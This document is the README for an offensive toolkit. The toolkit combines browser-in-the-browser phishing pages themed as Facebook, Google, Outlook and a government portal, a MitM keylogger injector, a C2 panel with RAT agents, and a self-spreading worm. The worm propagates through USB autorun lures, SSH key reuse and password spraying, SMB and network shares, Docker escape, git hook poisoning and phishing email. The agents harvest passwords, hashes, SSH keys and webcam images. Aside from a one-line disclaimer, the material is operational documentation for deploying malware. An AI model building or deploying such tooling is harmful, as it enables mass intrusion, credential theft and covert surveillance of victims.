# Offensive Operations Toolkit
**Authorized penetration testing only. Unauthorized use is illegal.**

---

## Overview

A full-stack offensive security toolkit with three operation modes:

| Mode | Description |
|------|-------------|
| **1. BitB** | Browser-in-the-Browser phishing overlay |
| **2. MitM Keylogger** | ARP/DNS spoofing + JS keylogger injection |
| **3. Payload C2** | Full C2 server with advanced agents and worm |

---

## Quick Start

```bash
bash start
```

Interactive wizard — picks tunnel, operation mode, and builds all payloads.

---

## Project Structure

```
Keylogger/
├── start                    # Main launcher wizard
├── README.md
└── op/
    ├── c2/
    │   └── c2_server.py     # C2 HTTP server (port 8888) + TCP listener (4444)
    ├── victim/
    │   ├── agent_http.py    # Standard RAT agent (source)
    │   ├── worm_agent.py    # Self-propagating worm (source)
    │   ├── agent.ps1        # PowerShell agent (source)
    │   └── worm_agent.ps1   # PowerShell worm (source)
    ├── payloads/            # Baked payloads (C2 URL injected)
    │   ├── agent_http.py
    │   ├── agent.py
    │   ├── agent.ps1
    │   ├── worm_agent.py
    │   ├── worm_agent.ps1
    │   └── SecureCertUpdate.hta
    ├── bitb/
    │   ├── index.html       # Default BitB page
    │   └── themes/          # facebook / google / gov-gambia / julazone / outlook
    ├── mitm/
    │   ├── intercept.py     # mitmproxy JS keylogger injector
    │   └── catcher.py       # Keystroke/credential catcher server
    └── logs/
        ├── credentials.txt
        ├── loot/            # Screenshots, webcam captures, exfiltrated files
        └── mitm/
```

---

## C2 Panel

Access at `http://localhost:8888/panel` (or via tunnel URL).

### Tabs

| Tab | Function |
|-----|----------|
| **Agents** | All connected agents — click row to select |
| **Command** | Send commands + quick-action buttons |
| **Output** | Live results, screenshots, webcam images |
| **Credentials** | Captured logins from portal/BitB/keylogger |
| **Loot Gallery** | Screenshots, webcam photos, exfiltrated files |
| **Worm Family** | Live view of all worm instances + spread activity |
| **Worm Control** | Remote control all worm spreading vectors |

### Agent Commands

```
RECON           — system info, network, env vars
SYSINFO         — full system dump
SCREENSHOT      — capture screen → loot gallery
WEBCAM          — capture webcam photo → loot gallery
CLIPBOARD       — grab clipboard contents
KEYLOG_START    — start keylogger thread
KEYLOG_DUMP     — flush captured keystrokes
PERSIST         — reinstall persistence mechanisms
PRIVESC         — check sudo/SUID/capabilities
HASHDUMP        — dump /etc/shadow or SAM hashes
SSHKEYS         — harvest all SSH private keys
BROWSERS        — dump cookies, localStorage, saved passwords
NETWORK         — interfaces, routes, open ports
DRIVES          — list removable drives
EXFIL           — auto-exfiltrate documents/keys/configs
SPREAD          — spread to connected USB drives now
SSH_TARGETS     — list SSH targets from known_hosts/history
NET_SCAN        — scan local /24 for live SSH hosts
SSH_SPRAY       — password spray live SSH hosts
SMB_SCAN        — find writable SMB shares
NET_MOUNTS      — infect mounted network shares
GIT_POISON      — inject post-commit hooks in git repos
EMAIL_SPREAD    — send phishing emails to harvested contacts
DOCKER_ESCAPE   — escape Docker container to host
CLEAN           — wipe agent logs
SELFDESTRUCT    — wipe persistence + self-delete
GETFILE <path>  — exfiltrate a specific file
```

---

## Worm Agent

### Spreading Vectors (8 total)

| Vector | Method |
|--------|--------|
| USB | LNK folder lures + fast-deploy VBS + autorun.inf |
| SSH Keys | Spread to known_hosts targets using harvested keys |
| SSH Scan | Scan /24 subnet + spread via SSH keys |
| SSH Spray | Password spray with 80 harvested + common passwords |
| SMB | Write to writable Windows shares via smbclient |
| Net Mounts | Infect CIFS/NFS mounts from /proc/mounts |
| Docker | Escape container via /proc/1/root + privileged mount |
| Git Hooks | Inject post-commit hooks in local git repos |
| Email | Harvest contacts + send phishing with worm attached |

### Worm Control Commands

```
WORM_STATUS              — dump all flags, skip list, spread log, C2 URL
WORM_PAUSE               — freeze all threads (keeps polling every 5s)
WORM_RESUME              — unfreeze
WORM_STOP_SPREAD         — master off (agent still runs + polls)
WORM_START_SPREAD        — master on
WORM_SPREAD_NOW          — force immediate spread cycle (bypass timer)

WORM_USB_ON / OFF        — USB drive infection
WORM_SSH_ON / OFF        — SSH key + scan spreading
WORM_SPRAY_ON / OFF      — SSH password spray
WORM_SMB_ON / OFF        — SMB share infection
WORM_EMAIL_ON / OFF      — email phishing spread
WORM_NETMOUNT_ON / OFF   — network mount infection
WORM_DOCKER_ON / OFF     — Docker escape vector
WORM_GIT_ON / OFF        — git hook poisoning

WORM_SKIP <host>         — add host/IP to permanent skip list
WORM_CLEAR_SKIP          — clear the skip list
WORM_CLEAR_LOG           — forget all spread history (will re-attempt)
WORM_LIST_TARGETS        — show spread log + skip list
WORM_SET_INTERVAL <n>    — change poll interval (seconds, min 3)
WORM_SET_C2 <url>        — hot-swap C2 URL without restart
```

### Worm agent IDs start with `w` — visible in pink in the panel.

---

## USB Drive (Dual-Purpose)

The CHARLIEKIRK USB is configured for **two simultaneous use cases**:

### Operator Mode
```bash
bash /media/.../run.sh
```
Installs operator kill-switch token (`~/.op_token`) then launches the full toolkit.

### Victim Mode (auto-deploy on plug-in)
- **Windows**: Victim sees folder lures (`Documents`, `Photos`, `Work Files`, `Backup`)
  - Click any → VBS fires, copies worm to `%APPDATA%`, adds registry Run key, launches silently
  - Older systems: `autorun.inf` triggers without any click
- **Linux**: `Documents.desktop` → worm copies to `~/.local/share/` and runs in background

Hidden files: `.cache/update.py` (baked worm) + `.cache/deploy.vbs` — auto-hidden via `attrib +h +s` after first victim execution.

---

## Operator Kill-Switch

The worm checks for a secret token before running. If found, it exits silently — your machine is never infected.

**Token:** `1bff231c9f73c3232858a913ba393bfcf7573aa5324e67d8`

Install on any operator machine:
```bash
echo "1bff231c9f73c3232858a913ba393bfcf7573aa5324e67d8" > ~/.op_token
```

`run.sh` on the USB does this automatically.

---

## Delivery Methods

| Method | File | Target |
|--------|------|--------|
| Portal phishing | `/banner` (served by C2) | All browsers |
| BitB overlay | `/op/bitb/index.html` | Desktop browsers |
| HTA dropper | `SecureCertUpdate.hta` | Windows (double-click) |
| PowerShell | `agent.ps1` | Windows (run as admin) |
| USB lures | `.cache/deploy.vbs` | Windows auto-run |
| Email attachment | `worm_agent.py` | Python-capable targets |

---

## C2 Server Environment Variables

```bash
C2_PORT=8888          # Panel port (default 8888)
AGENT_PORT=4444       # TCP agent listener
LOG_DIR=./op/logs     # Logs + loot directory
PAYLOAD_DIR=./op/payloads  # Served payload files
```

Launch:
```bash
LOG_DIR=./op/logs PAYLOAD_DIR=./op/payloads python3 op/c2/c2_server.py
```
